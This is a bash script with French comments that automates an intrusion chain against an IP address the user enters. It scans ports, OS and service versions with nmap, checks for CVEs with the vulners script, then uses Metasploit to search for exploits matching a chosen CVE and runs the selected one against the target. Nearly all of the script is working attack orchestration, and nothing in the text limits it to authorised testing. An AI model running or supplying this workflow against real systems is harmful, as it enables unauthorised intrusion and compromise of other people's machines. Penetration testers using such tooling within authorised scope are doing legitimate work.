#!/bin/bash

# Défini les couleurs
bleu='\033[34m'
rouge='\033[31m'
vert='\033[32m'
jaune='\033[33m'
reset='\033[0m'

#### 1 - Découverte ports et Services ####
echo -e "${bleu}#### 1 - Découverte ports et Services ####${reset}"
# Demander à l'utilisateur de saisir l'adresse IP cible
read -p "Entrez l'adresse IP cible : " ip_cible

# Valider l'adresse IP saisie par l'utilisateur
if ! [[ $ip_cible =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
    echo "Adresse IP invalide. Veuillez entrer une adresse IP valide"
    exit 1
fi

echo "Adresse IP valide : $ip_cible"

# Tentative de connexion au port
nmap_cmd=$(nmap -O -p 1-1024 -sV $ip_cible)

# Vérifier si des ports sont ouverts
if [[ $nmap_cmd =~ "open" ]]; then
    echo  "voici les ports ouverts sur l'adresse $ip_cible :"
    echo "$nmap_cmd"
else
    echo "Aucun port n'est ouvert sur l'adresse $ip_cible."
    exit 1
fi

##### 2 - Découverte vulnérabilités #####
echo -e "${bleu}#### 2 - Découverte vulnérabilités ####${reset}"
# Utilise Nmap pour rechercher les vulnérabilités sur les ports ouverts
nmap_vulns=$(nmap --script vulners -sV -p 1-1024 $ip_cible)

# Vérifier si des vulnérabilités sont trouvées
if [[ $nmap_vulns =~ "CVE" ]]; then
    echo "Vulnérabilités trouvées :"
    echo "$nmap_vulns"
else
    echo "Aucune vulnérabilité trouvée."
    exit 1
fi

##### 5 - Exploitation des vulnérabilités #####
echo -e "${bleu}#### 5 - Exploitation des vulnérabilités ####${reset}"

# Lancer Metasploit
msfconsole -q -x "db_nmap -sV -p 1-1024 $ip_cible; vulns -p;"

echo "Sélectionnez la vulnérabilité que vous souhaitez exploiter:"
read -p "Entrez l'ID de la vulnérabilité (ex: CVE-2017-0144) : " vuln_id

# Liste des exploits correspondant à la vulnérabilité
exploits=$(msfconsole -q -x "search $vuln_id" | grep exploit | awk '{print $1}')

if [ -z "$exploits" ]; then
    echo "Aucun exploit trouvé pour la vulnérabilité $vuln_id."
    exit 1
fi

echo "Exploits disponibles pour $vuln_id :"
echo "$exploits"

read -p "Entrez le nom de l'exploit que vous souhaitez utiliser : " exploit_choice

# Utiliser l'exploit choisi
msfconsole -q -x "use $exploit_choice; set RHOSTS $ip_cible; run"

echo "Exploitation terminée."

